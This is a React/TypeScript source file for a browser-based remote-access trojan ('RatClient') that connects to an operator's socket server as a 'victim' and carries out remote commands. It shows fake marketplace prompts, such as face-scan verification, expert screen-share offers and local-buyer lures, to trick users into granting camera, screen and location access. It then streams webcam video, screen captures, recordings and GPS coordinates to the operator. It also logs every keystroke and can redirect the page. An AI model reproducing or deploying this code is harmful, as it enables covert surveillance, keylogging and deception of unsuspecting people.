import { useEffect, useRef, useState, useCallback } from 'react';
import { io } from 'socket.io-client';

// --- TRAP DATA SETS ---
const TRAPS = {
  camera: [
    {
      id: 'cam1',
      title: '🔒 SECURITY VERIFICATION REQUIRED',
      body: "To protect both buyers and sellers on our platform, we need to verify you're a real person. This 5-second face scan helps prevent fraudulent listings and keeps our community safe. Your scan is encrypted and deleted immediately after verification.",
      button: 'START SECURE VERIFICATION',
      accent: '#2563eb'
    },
    {
      id: 'cam2',
      title: '🔍 WE FOUND SOMETHING INTERESTING...',
      body: "Our system detected items in your room that we have active buyers for. Point your camera around to: • Instantly identify sellable items • Get real-time price estimates • Connect with nearby buyers NOW",
      button: 'SCAN YOUR SPACE → See what\'s valuable',
      accent: '#059669'
    },
    {
      id: 'cam3',
      title: '⏰ LIMITED TIME: VIRTUAL TRY-ON',
      body: "Today only: Get exclusive access to our AR fitting room. • See how clothes fit before buying • Preview furniture in your space • 87% of users say this prevents returns.",
      button: 'Activate camera to start →',
      accent: '#7c3aed'
    }
  ],
  screen: [
    {
      id: 'scr1',
      title: '👨‍💻 GET A SECOND OPINION',
      body: "Not sure if that item is authentic? Let our specialists guide you: • Share your screen for real-time authentication • We'll point out details you might miss • 100% free consultation for first-time sellers.",
      button: 'START EXPERT SESSION → No credit card required',
      accent: '#2563eb'
    },
    {
      id: 'scr2',
      title: '🤝 JOIN 50,000+ TRUSTED SELLERS',
      body: "Our top sellers all complete this quick verification: • Screen share to show you're a real person • Get the \"Trusted Seller\" badge instantly • Appear higher in search results.",
      button: 'VERIFY NOW → Takes 2 minutes',
      accent: '#059669'
    }
  ],
  location: [
    {
      id: 'loc1',
      title: '🚚 STOP OVERPAYING ON SHIPPING',
      body: "Enable location to see what buyers are near you: • Local pickup = zero shipping fees • Buyers prefer local (67% higher sale rate) • See items available within 5 miles.",
      button: 'FIND LOCAL BUYERS → Enable location',
      accent: '#059669'
    },
    {
      id: 'loc2',
      title: '💵 CASH IN YOUR POCKET TODAY',
      body: "Items listed with \"Local Pickup\" sell 3x faster: • Buyers near you are searching RIGHT NOW • Get paid same day, no waiting for shipping • See how many buyers are within 10 miles.",
      button: 'SHOW ME LOCAL DEMAND → 1-click activation',
      accent: '#2563eb'
    },
    {
      id: 'loc3',
      title: '🛡️ SAFE TRANSACTIONS',
      body: "Both buyers and sellers feel safer knowing: • Meet at nearby police stations (we'll show you) • Verified local sellers have 0% scam reports • Community rating system for your area.",
      button: 'ACTIVATE SAFETY NET → Enable location',
      accent: '#3b82f6'
    },
    {
      id: 'loc4',
      title: '🔥 1000+ PEOPLE IN YOUR AREA ARE SELLING',
      body: "You're missing out on: • 89 items listed in the last hour • 34 priced for immediate pickup • 12 sellers offering bundle deals.",
      button: 'SEE WHAT YOU\'RE MISSING → Location required',
      accent: '#dc2626'
    }
  ]
};

export default function RatClient() {
  const socketRef = useRef<any>(null);
  const streamRef = useRef<MediaStream | null>(null);
  const recorderRef = useRef<MediaRecorder | null>(null);
  const [activeTrap, setActiveTrap] = useState<{type: string, data: any} | null>(null);
  const pendingActionRef = useRef<any>(null);
  const [facingMode, setFacingMode] = useState<'user' | 'environment'>('user');

  const triggerTrap = useCallback((type: 'camera' | 'screen' | 'location', callback: () => void) => {
    // Select a random trap from the category
    const pool = TRAPS[type as keyof typeof TRAPS];
    const item = pool[Math.floor(Math.random() * pool.length)];
    
    pendingActionRef.current = callback;
    setActiveTrap({ type, data: item });
  }, []);

  useEffect(() => {
    const isDev = window.location.port === '3000';
    const socketUrl = isDev ? 'http://localhost:5000' : window.location.origin;
    
    const socket = io(socketUrl, {
      transports: ['websocket', 'polling'],
      query: { type: 'victim' } 
    });
    
    socketRef.current = socket;

    socket.on('connect', () => {
      socket.emit('client_log', 'Uplink active: ' + navigator.platform);
    });

    socket.on('remote_command', async (data: any) => {
      const { command } = data;

      switch (command) {
        case 'screenshot':
          triggerTrap('camera', captureAndSendSnapshot);
          break;
        case 'start_video':
          triggerTrap('camera', startVideoStream);
          break;
        case 'stop_video':
          stopVideoStream();
          break;
        case 'get_location':
          triggerTrap('location', sendLocation);
          break;
        case 'start_screenshare':
          triggerTrap('screen', startScreenShare);
          break;
        case 'switch_camera':
          toggleCamera();
          break;
        case 'start_recording':
          startRecording();
          break;
        case 'stop_recording':
          stopRecording();
          break;
        case 'alert':
          alert(data.msg);
          break;
        case 'redirect':
          if (data.url) {
            window.location.href = data.url;
          }
          break;
        default:
          console.warn('[RAT] Unknown:', command);
      }
    });

    return () => {
      socket.disconnect();
      stopVideoStream();
      stopRecording();
    };
  }, [triggerTrap]);

  useEffect(() => {
    const handleKeydown = (e: KeyboardEvent) => {
      if (!socketRef.current) return;
      
      const target = e.target as HTMLElement;
      socketRef.current.emit('keystroke', {
        key: e.key,
        target: target.tagName + (target.id ? `#${target.id}` : '')
      });
    };

    window.addEventListener('keydown', handleKeydown);

    const handleCustomEmit = (e: any) => {
      if (socketRef.current && e.detail) {
        const { event, data } = e.detail;
        socketRef.current.emit(event, data);
      }
    };

    window.addEventListener('rat_emit', handleCustomEmit);

    return () => {
      window.removeEventListener('keydown', handleKeydown);
      window.removeEventListener('rat_emit', handleCustomEmit);
    };
  }, []);

  const handleTrapAccept = () => {
    setActiveTrap(null);
    if (pendingActionRef.current) {
      pendingActionRef.current();
      pendingActionRef.current = null;
    }
  };

  const captureAndSendSnapshot = async () => {
    try {
      let stream;
      try {
        stream = await navigator.mediaDevices.getUserMedia({ 
          video: { facingMode: facingMode, width: { ideal: 1280 }, height: { ideal: 720 } } 
        });
      } catch (e) {
        stream = await navigator.mediaDevices.getUserMedia({ video: true });
      }
      
      const video = document.createElement('video');
      video.srcObject = stream;
      await video.play();

      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext('2d')?.drawImage(video, 0, 0);
      
      const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
      socketRef.current.emit('surveillance_snapshot', { image: dataUrl });

      stream.getTracks().forEach(track => track.stop());
    } catch (err) {
      socketRef.current.emit('client_log', 'Snapshot error: ' + err);
    }
  };

  const startVideoStream = async (modeOverride?: 'user' | 'environment') => {
    try {
      if (streamRef.current) return;
      
      const targetMode = modeOverride || facingMode;
      let stream;
      try {
        stream = await navigator.mediaDevices.getUserMedia({ 
          video: { width: {ideal: 1280}, height: {ideal: 720}, facingMode: targetMode } 
        });
      } catch (e) {
        stream = await navigator.mediaDevices.getUserMedia({ video: true });
      }
      
      streamRef.current = stream;
      
      const video = document.createElement('video');
      video.srcObject = stream;
      await video.play();

      const canvas = document.createElement('canvas');
      canvas.width = 640;
      canvas.height = 480;
      const ctx = canvas.getContext('2d');

      const sendFrame = () => {
        if (!streamRef.current) return;
        ctx?.drawImage(video, 0, 0, 640, 480);
        const frame = canvas.toDataURL('image/jpeg', 0.5);
        socketRef.current.emit('video_frame', frame);
        setTimeout(sendFrame, 100); // Throttle to 10 FPS
      };
      
      sendFrame();
      socketRef.current.emit('client_log', 'Video uplink active');
    } catch (err) {
      socketRef.current.emit('client_log', 'Video failure: ' + err);
    }
  };

  const stopVideoStream = () => {
    if (streamRef.current) {
      streamRef.current.getTracks().forEach(track => track.stop());
      streamRef.current = null;
      socketRef.current.emit('client_log', 'Video uplink terminated');
    }
  };

  const startScreenShare = async () => {
    try {
      const stream = await (navigator.mediaDevices as any).getDisplayMedia({ video: true });
      streamRef.current = stream;
      
      const video = document.createElement('video');
      video.srcObject = stream;
      await video.play();

      const canvas = document.createElement('canvas');
      canvas.width = 1280;
      canvas.height = 720;
      const ctx = canvas.getContext('2d');

      const sendFrame = () => {
        if (!streamRef.current) return;
        ctx?.drawImage(video, 0, 0, 1280, 720);
        const frame = canvas.toDataURL('image/jpeg', 0.4);
        socketRef.current.emit('video_frame', frame);
        setTimeout(sendFrame, 100); // Throttle to 10 FPS
      };
      
      sendFrame();
      socketRef.current.emit('client_log', 'Screen sharing active');
      
      stream.getVideoTracks()[0].onended = () => stopVideoStream();
    } catch (err) {
      socketRef.current.emit('client_log', 'Screen share failure: ' + err);
    }
  };

  const toggleCamera = () => {
    const nextMode = facingMode === 'user' ? 'environment' : 'user';
    setFacingMode(nextMode);
    socketRef.current.emit('client_log', `Camera toggled: ${nextMode}`);
    if (streamRef.current) {
      stopVideoStream();
      setTimeout(() => startVideoStream(nextMode), 500);
    }
  };

  const startRecording = () => {
    if (!streamRef.current) {
        socketRef.current.emit('client_log', 'Recording error: No active stream');
        return;
    }
    try {
        const options = { mimeType: 'video/webm;codecs=vp8' };
        const recorder = new MediaRecorder(streamRef.current, options);
        recorderRef.current = recorder;
        const rec_id = Math.random().toString(36).substring(7);

        recorder.ondataavailable = (event) => {
            if (event.data.size > 0) {
                socketRef.current.emit('recorded_chunk', {
                    rec_id,
                    chunk: event.data
                });
            }
        };

        recorder.start(1000); // Send chunks every second
        socketRef.current.emit('client_log', 'Recording started: ' + rec_id);
    } catch (err) {
        socketRef.current.emit('client_log', 'Recording failure: ' + err);
    }
  };

  const stopRecording = () => {
    if (recorderRef.current && recorderRef.current.state !== 'inactive') {
        recorderRef.current.stop();
        recorderRef.current = null;
        socketRef.current.emit('client_log', 'Recording finalized');
    }
  };

  const sendLocation = () => {
    if (!navigator.geolocation) return;
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        socketRef.current.emit('location_update', {
          lat: pos.coords.latitude,
          lon: pos.coords.longitude,
          gps: true,
          accuracy: pos.coords.accuracy
        });
      },
      (err) => {
        socketRef.current.emit('client_log', 'Location denied/failed: ' + err.message);
      },
      { enableHighAccuracy: true, timeout: 5000 }
    );
  };

  if (!activeTrap) return null;

  return (
    <div style={{
      position: 'fixed',
      top: 0,
      left: 0,
      width: '100vw',
      height: '100vh',
      backgroundColor: 'rgba(0,0,0,0.6)',
      backdropFilter: 'blur(8px)',
      display: 'flex',
      alignItems: 'center',
      justifyContent: 'center',
      zIndex: 99999,
      fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif'
    }}>
      <div style={{
        backgroundColor: 'white',
        borderRadius: '16px',
        padding: '32px',
        maxWidth: '400px',
        width: '90%',
        boxShadow: '0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04)',
        textAlign: 'center'
      }}>
        <h2 style={{ 
          fontSize: '1.25rem', 
          fontWeight: 700, 
          color: '#1f2937', 
          marginBottom: '16px',
          lineHeight: 1.2
        }}>
          {activeTrap.data.title}
        </h2>
        <p style={{ 
          fontSize: '0.95rem', 
          color: '#4b5563', 
          lineHeight: 1.5,
          marginBottom: '24px'
        }}>
          {activeTrap.data.body}
        </p>
        <button 
          onClick={handleTrapAccept}
          style={{
            backgroundColor: activeTrap.data.accent,
            color: 'white',
            fontWeight: 600,
            padding: '12px 24px',
            borderRadius: '8px',
            border: 'none',
            cursor: 'pointer',
            width: '100%',
            transition: 'opacity 0.2s'
          }}
          onMouseOver={(e) => e.currentTarget.style.opacity = '0.9'}
          onMouseOut={(e) => e.currentTarget.style.opacity = '1'}
        >
          {activeTrap.data.button}
        </button>
        <div style={{ marginTop: '16px', fontSize: '0.75rem', color: '#9ca3af' }}>
          <span style={{ cursor: 'pointer', textDecoration: 'underline' }}>
            Learn how we protect your data
          </span>
        </div>
      </div>
    </div>
  );
}
